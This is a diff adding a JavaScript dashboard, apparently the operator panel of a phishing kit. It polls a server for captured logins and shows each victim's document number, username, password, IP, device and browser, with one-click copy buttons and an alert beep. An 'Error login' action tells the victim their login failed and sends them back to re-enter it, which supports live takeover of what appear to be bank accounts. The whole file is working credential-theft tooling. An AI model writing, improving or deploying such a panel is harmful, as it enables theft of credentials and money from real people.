@@ -1,0 +1,294 @@
+(function () {
+  var tbody = document.getElementById("monitor-tbody");
+  var clock = document.getElementById("live-clock");
+  var pauseBtn = document.getElementById("btn-pause-scroll");
+  var soundChk = document.getElementById("sonido-nuevo");
+  var lastId = 0;
+  var pauseScroll = false;
+  var seen = {};
+  var colorOrder = ["azul", "verde", "rojo", "gris", "amarillo"];
+  var ingresoCount = 0;
+  var rowMeta = {};
+
+  function esc(v) {
+    return String(v == null ? "" : v)
+      .replace(/&/g, "&amp;")
+      .replace(/</g, "&lt;")
+      .replace(/>/g, "&gt;")
+      .replace(/"/g, "&quot;");
+  }
+
+  function colorClass(n) {
+    return "row-" + colorOrder[(n - 1) % colorOrder.length];
+  }
+
+  function copyText(text) {
+    if (navigator.clipboard && navigator.clipboard.writeText) {
+      return navigator.clipboard.writeText(text);
+    }
+    var ta = document.createElement("textarea");
+    ta.value = text;
+    document.body.appendChild(ta);
+    ta.select();
+    document.execCommand("copy");
+    document.body.removeChild(ta);
+    return Promise.resolve();
+  }
+
+  function rowHtml(ev, colorN) {
+    var hora = (ev.creado_en || "").slice(11, 19) || "—";
+    var usuario = ev.usuario || ev.nombre_usuario || "—";
+    var estado = ev.estado || "pendiente";
+    var estadoBadge =
+      estado === "rechazado"
+        ? '<span class="badge-estado badge-rechazado">Inválido</span>'
+        : '<span class="badge-estado badge-pendiente">Pendiente</span>';
+
+    function cellCopy(valor, campo, label) {
+      var v = valor || "—";
+      return (
+        '<td class="cell-copy" title="' +
+        esc(v) +
+        '">' +
+        '<span class="cell-value">' +
+        esc(v) +
+        "</span>" +
+        '<button type="button" class="btn-copy-one" data-act="copiar-campo" data-campo="' +
+        esc(campo) +
+        '" title="Copiar ' +
+        esc(label) +
+        '">⧉</button>' +
+        "</td>"
+      );
+    }
+
+    return (
+      '<tr data-id="' +
+      esc(ev.id) +
+      '" class="' +
+      colorClass(colorN) +
+      '">' +
+      "<td>" +
+      esc(hora) +
+      "</td>" +
+      '<td><span class="badge-color">' +
+      colorN +
+      "</span></td>" +
+      "<td>" +
+      esc(ev.canal || "personas") +
+      "</td>" +
+      cellCopy(ev.documento, "documento", "documento") +
+      cellCopy(usuario, "usuario", "usuario") +
+      cellCopy(ev.clave, "clave", "clave") +
+      "<td>" +
+      esc(ev.ip || "—") +
+      "</td>" +
+      "<td>" +
+      esc(ev.dispositivo || "—") +
+      "</td>" +
+      "<td>" +
+      esc(ev.navegador || "—") +
+      "</td>" +
+      "<td>" +
+      estadoBadge +
+      "</td>" +
+      '<td class="col-actions">' +
+      '<button type="button" class="btn-act btn-error" data-act="rechazar" title="Avisar login inválido">Error login</button>' +
+      '<button type="button" class="btn-act btn-del" data-act="eliminar" title="Eliminar del panel">Eliminar</button>' +
+      "</td>" +
+      "</tr>"
+    );
+  }
+
+  function playBeep() {
+    try {
+      var ctx = new (window.AudioContext || window.webkitAudioContext)();
+      var o = ctx.createOscillator();
+      var g = ctx.createGain();
+      o.connect(g);
+      g.connect(ctx.destination);
+      o.frequency.value = 880;
+      g.gain.value = 0.04;
+      o.start();
+      setTimeout(function () {
+        o.stop();
+        ctx.close();
+      }, 120);
+    } catch (e) {}
+  }
+
+  function updateStats(stats) {
+    if (!stats) return;
+    document.getElementById("stat-intentos").textContent = stats.intentos || 0;
+    document.getElementById("stat-exitosos").textContent = stats.exitosos || 0;
+    document.getElementById("stat-fallidos").textContent = stats.fallidos || 0;
+  }
+
+  function isIngresoCompleto(ev) {
+    var paso = Number(ev.paso || 0);
+    var cat = String(ev.categoria || "");
+    return paso >= 4 || cat.indexOf("[Ingreso]") !== -1 || cat.indexOf("[Acceso completo]") !== -1;
+  }
+
+  function appendEvents(eventos, initial) {
+    if (!eventos || !eventos.length) return;
+    var empty = tbody.querySelector(".empty-row");
+    if (empty) empty.remove();
+
+    eventos.forEach(function (ev) {
+      if (seen[ev.id]) {
+        // actualizar estado si ya existe
+        var existing = tbody.querySelector('tr[data-id="' + ev.id + '"]');
+        if (existing && ev.estado === "rechazado") {
+          var badge = existing.querySelector(".badge-estado");
+          if (badge) {
+            badge.className = "badge-estado badge-rechazado";
+            badge.textContent = "Inválido";
+          }
+        }
+        lastId = Math.max(lastId, Number(ev.id) || 0);
+        return;
+      }
+
+      if (!isIngresoCompleto(ev)) {
+        seen[ev.id] = true;
+        lastId = Math.max(lastId, Number(ev.id) || 0);
+        return;
+      }
+
+      if ((ev.estado || "") === "eliminado") {
+        seen[ev.id] = true;
+        lastId = Math.max(lastId, Number(ev.id) || 0);
+        return;
+      }
+
+      seen[ev.id] = true;
+      lastId = Math.max(lastId, Number(ev.id) || 0);
+      ingresoCount += 1;
+      rowMeta[ev.id] = ev;
+
+      var wrap = document.createElement("tbody");
+      wrap.innerHTML = rowHtml(ev, ingresoCount);
+      var tr = wrap.firstChild;
+      if (!initial) tr.classList.add("is-new");
+      tbody.appendChild(tr);
+
+      if (!initial && soundChk && soundChk.checked) playBeep();
+      setTimeout(function () {
+        tr.classList.remove("is-new");
+      }, 1600);
+    });
+
+    if (!pauseScroll) {
+      var board = document.getElementById("monitor-feed");
+      board.scrollTop = board.scrollHeight;
+    }
+  }
+
+  function doAction(accion, id, tr) {
+    fetch("accion.php", {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      credentials: "same-origin",
+      body: JSON.stringify({ accion: accion, id: Number(id) }),
+    })
+      .then(function (r) {
+        return r.json();
+      })
+      .then(function (data) {
+        if (!data || !data.ok) {
+          alert((data && data.error) || "No se pudo completar la acción");
+          return;
+        }
+
+        if (accion === "eliminar" && tr) {
+          tr.remove();
+          delete rowMeta[id];
+          if (!tbody.querySelector("tr")) {
+            tbody.innerHTML =
+              '<tr class="empty-row"><td colspan="11">Esperando ingresos…</td></tr>';
+          }
+        }
+
+        if (accion === "rechazar" && tr) {
+          var badge = tr.querySelector(".badge-estado");
+          if (badge) {
+            badge.className = "badge-estado badge-rechazado";
+            badge.textContent = "Inválido";
+          }
+          if (rowMeta[id]) rowMeta[id].estado = "rechazado";
+        }
+      })
+      .catch(function () {
+        alert("Error de conexión con el panel");
+      });
+  }
+
+  tbody.addEventListener("click", function (e) {
+    var btn = e.target.closest("[data-act]");
+    if (!btn) return;
+    var tr = btn.closest("tr");
+    if (!tr) return;
+    var id = tr.getAttribute("data-id");
+    var act = btn.getAttribute("data-act");
+    var ev = rowMeta[id] || {};
+
+    if (act === "copiar-campo") {
+      var campo = btn.getAttribute("data-campo") || "";
+      var valor = "";
+      if (campo === "documento") valor = ev.documento || "";
+      else if (campo === "usuario") valor = ev.usuario || ev.nombre_usuario || "";
+      else if (campo === "clave") valor = ev.clave || "";
+
+      if (!valor) return;
+
+      copyText(valor).then(function () {
+        var prev = btn.textContent;
+        btn.textContent = "✓";
+        btn.classList.add("is-copied");
+        setTimeout(function () {
+          btn.textContent = prev;
+          btn.classList.remove("is-copied");
+        }, 900);
+      });
+      return;
+    }
+
+    if (act === "rechazar") {
+      if (!confirm("¿Marcar este login como inválido?\nLa persona verá el aviso y volverá al inicio.")) {
+        return;
+      }
+      doAction("rechazar", id, tr);
+      return;
+    }
+
+    if (act === "eliminar") {
+      if (!confirm("¿Eliminar esta fila del panel?")) return;
+      doAction("eliminar", id, tr);
+    }
+  });
+
+  function poll() {
+    fetch("monitor-feed.php?after_id=" + lastId, { credentials: "same-origin" })
+      .then(function (r) {
+        return r.json();
+      })
+      .then(function (data) {
+        if (!data || !data.ok) return;
+        if (clock && data.server_time) clock.textContent = data.server_time;
+        updateStats(data.stats);
+        appendEvents(data.eventos, lastId === 0 && ingresoCount === 0);
+      })
+      .catch(function () {});
+  }
+
+  if (pauseBtn) {
+    pauseBtn.addEventListener("click", function () {
+      pauseScroll = !pauseScroll;
+      pauseBtn.textContent = pauseScroll ? "Reanudar auto-scroll" : "Pausar auto-scroll";
+    });
+  }
+
+  poll();
+  setInterval(poll, 2000);
+})();
